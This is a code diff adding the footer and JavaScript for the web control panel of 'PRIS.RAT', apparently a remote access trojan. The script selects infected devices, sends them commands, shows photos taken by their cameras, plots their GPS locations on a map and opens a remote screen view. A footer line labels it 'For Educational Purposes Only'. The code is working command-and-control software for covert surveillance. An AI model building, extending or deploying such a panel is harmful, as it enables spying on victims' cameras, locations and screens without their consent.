@@ -1063,4 +1063,253 @@ body {
 
     <!-- Footer -->
     <div style="text-align: center; margin-top: 20px; padding: 20px; color: var(--text-dim); font-size: 11px; border-top: 1px solid var(--border);">
-      <div style="font-size: 13px; font-weight: bold; margin-bottom: 8px; letter-spacing:
+      <div style="font-size: 13px; font-weight: bold; margin-bottom: 8px; letter-spacing: 2px;">
+        <span style="color: var(--red);">PRIS.RAT</span> © 2026
+      </div>
+      <div>Developed by <strong style="color: var(--red);">mkgg449-dotcom</strong></div>
+      <div style="margin-top: 5px;">All Rights Reserved · For Educational Purposes Only</div>
+    </div>
+
+  </main>
+</div>
+
+<script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+<script>
+let selectedDevice = null;
+const socket = io();
+
+/* ============ CLOCK ============ */
+function updateClock() {
+  const now = new Date();
+  document.getElementById('clockTime').textContent = now.toLocaleTimeString('ar-EG');
+  document.getElementById('clockDate').textContent = now.toLocaleDateString('ar-EG');
+}
+setInterval(updateClock, 1000);
+updateClock();
+
+/* ============ SOCKET ============ */
+socket.on('devices_update', () => setTimeout(() => location.reload(), 800));
+
+socket.on('device_response', (data) => {
+  if (data.type === 'camera' && data.image) showImage('data:image/jpeg;base64,' + data.image);
+  if (data.type === 'location') {
+    if (data.lat && data.lon && (data.lat !== 0 || data.lon !== 0)) {
+      addLocationToMap(data.lat, data.lon, data.id);
+      showToast('📍 ' + data.lat.toFixed(4) + ', ' + data.lon.toFixed(4), 'success');
+    }
+  }
+});
+
+/* ============ MENU ============ */
+function toggleMenu() {
+  document.getElementById('sidebar').classList.toggle('open');
+}
+
+/* ============ DEVICES ============ */
+function selectDevice(id, el) {
+  selectedDevice = id;
+  document.querySelectorAll('.devices-table tbody tr').forEach(r => r.classList.remove('selected'));
+  if (el) el.classList.add('selected');
+  showToast('✅ تم اختيار الجهاز', 'success');
+}
+
+function removeDevice(event, id) {
+  event.stopPropagation();
+  if (!confirm('إزالة الجهاز من القائمة؟')) return;
+  socket.emit('remove_device', { id: id });
+  showToast('🗑️ تم الإزالة', 'info');
+  if (selectedDevice === id) selectedDevice = null;
+}
+
+/* ============ COMMANDS ============ */
+function startScreen() {
+  if (!selectedDevice) { showToast('⚠️ اختر جهاز أولاً', 'error'); return; }
+  try { sessionStorage.setItem('selectedDevice', selectedDevice); } catch(e) {}
+  window.location.href = '/screen';
+}
+
+function cmd(action) {
+  if (!selectedDevice) { showToast('⚠️ اختر جهاز أولاً', 'error'); return; }
+  socket.emit('send_command', { target: selectedDevice, action: action });
+  showToast('📤 أُرسل: ' + action, 'info');
+}
+
+function cmdAndToast(action) {
+  if (!selectedDevice) { showToast('⚠️ اختر جهاز أولاً', 'error'); return; }
+  socket.emit('send_command', { target: selectedDevice, action: action });
+  showToast('📤 ' + action, 'info');
+}
+
+/* ============ IMAGE ============ */
+function showImage(src) {
+  const v = document.createElement('div');
+  v.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.95);display:flex;align-items:center;justify-content:center;z-index:99999;cursor:pointer;';
+  const img = document.createElement('img');
+  img.src = src;
+  img.style.cssText = 'max-width:95%;max-height:95%;border:3px solid #ff0033;border-radius:12px;box-shadow:0 0 40px rgba(255,0,51,0.8);';
+  v.appendChild(img);
+  v.onclick = () => v.remove();
+  document.body.appendChild(v);
+}
+
+/* ============ TOAST ============ */
+function showToast(msg, type) {
+  const t = document.createElement('div');
+  t.className = 'toast ' + type;
+  t.textContent = msg;
+  document.body.appendChild(t);
+  setTimeout(() => t.remove(), 3000);
+}
+
+/* ============ SYSTEM STATUS ============ */
+async function updateSystem() {
+  try {
+    const res = await fetch('/api/system');
+    const data = await res.json();
+    document.getElementById('cpuVal').textContent = data.cpu + '%';
+    document.getElementById('cpuBar').style.width = data.cpu + '%';
+    document.getElementById('ramVal').textContent = data.ram + '%';
+    document.getElementById('ramBar').style.width = data.ram + '%';
+    document.getElementById('diskVal').textContent = data.disk + '%';
+    document.getElementById('diskBar').style.width = data.disk + '%';
+    document.getElementById('netVal').textContent = data.net_recv + ' MB';
+  } catch(e) {}
+}
+setInterval(updateSystem, 3000);
+updateSystem();
+
+/* ============ ACTIVITY ============ */
+async function updateActivity() {
+  try {
+    const res = await fetch('/api/activity');
+    const data = await res.json();
+    const list = document.getElementById('activityList');
+    if (data.length === 0) {
+      list.innerHTML = '<div style="text-align:center;color:var(--text-dim);font-size:11px;padding:15px;">مافيش أحداث</div>';
+      return;
+    }
+    list.innerHTML = data.map(a => `
+      <div class="activity-item">
+        <div class="activity-icon">${a.icon}</div>
+        <div class="activity-info">
+          <div class="text">${a.text}</div>
+          <div class="device">${a.device || ''}</div>
+        </div>
+        <div class="activity-time">${a.time}</div>
+      </div>
+    `).join('');
+  } catch(e) {}
+}
+setInterval(updateActivity, 5000);
+updateActivity();
+
+/* ============ MAP ============ */
+let worldMap = null;
+function initMap() {
+  if (typeof L === 'undefined') return;
+  worldMap = L.map('worldMap', {
+    zoomControl: false,
+    attributionControl: false
+  }).setView([30, 20], 2);
+
+  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+    maxZoom: 19
+  }).addTo(worldMap);
+
+  L.control.zoom({ position: 'topright' }).addTo(worldMap);
+}
+
+function addLocationToMap(lat, lon, id) {
+  if (!worldMap) return;
+  const icon = L.divIcon({
+    className: 'custom-marker',
+    html: '<div style="background:#ff0033;width:14px;height:14px;border-radius:50%;box-shadow:0 0 15px #ff0033;border:2px solid #fff;"></div>',
+    iconSize: [14, 14]
+  });
+  L.marker([lat, lon], { icon: icon }).addTo(worldMap).bindPopup('Device: ' + id);
+  worldMap.setView([lat, lon], 5);
+}
+
+/* ============ TRAFFIC CHART ============ */
+let trafficChart = null;
+function initChart() {
+  if (typeof Chart === 'undefined') return;
+  const ctx = document.getElementById('trafficChart').getContext('2d');
+  trafficChart = new Chart(ctx, {
+    type: 'line',
+    data: {
+      labels: [],
+      datasets: [
+        {
+          label: 'Recv',
+          data: [],
+          borderColor: '#0099ff',
+          backgroundColor: 'rgba(0,153,255,0.1)',
+          tension: 0.4,
+          fill: true,
+          pointRadius: 0
+        },
+        {
+          label: 'Sent',
+          data: [],
+          borderColor: '#ff0033',
+          backgroundColor: 'rgba(255,0,51,0.1)',
+          tension: 0.4,
+          fill: true,
+          pointRadius: 0
+        }
+      ]
+    },
+    options: {
+      responsive: true,
+      maintainAspectRatio: false,
+      plugins: { legend: { display: false } },
+      scales: {
+        x: { display: false },
+        y: {
+          beginAtZero: true,
+          grid: { color: 'rgba(255,255,255,0.05)' },
+          ticks: { color: '#7a7e8a', font: { size: 10 } }
+        }
+      }
+    }
+  });
+}
+
+async function updateChart() {
+  if (!trafficChart) return;
+  try {
+    const res = await fetch('/api/system');
+    const data = await res.json();
+    const now = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });
+    if (trafficChart.data.labels.length > 15) {
+      trafficChart.data.labels.shift();
+      trafficChart.data.datasets[0].data.shift();
+      trafficChart.data.datasets[1].data.shift();
+    }
+    trafficChart.data.labels.push(now);
+    trafficChart.data.datasets[0].data.push(data.net_recv);
+    trafficChart.data.datasets[1].data.push(data.net_sent);
+    trafficChart.update('none');
+  } catch(e) {}
+}
+
+/* ============ QUICK NOTE ============ */
+const noteBox = document.getElementById('quickNote');
+if (noteBox) {
+  noteBox.value = localStorage.getItem('pris_note') || 'Stay secure. Use only for educational purposes.';
+  noteBox.addEventListener('input', () => {
+    localStorage.setItem('pris_note', noteBox.value);
+  });
+}
+
+/* ============ INIT ============ */
+window.addEventListener('load', () => {
+  initMap();
+  initChart();
+  setInterval(updateChart, 5000);
+  updateChart();
+});
+</script>
+</body>
+</html>
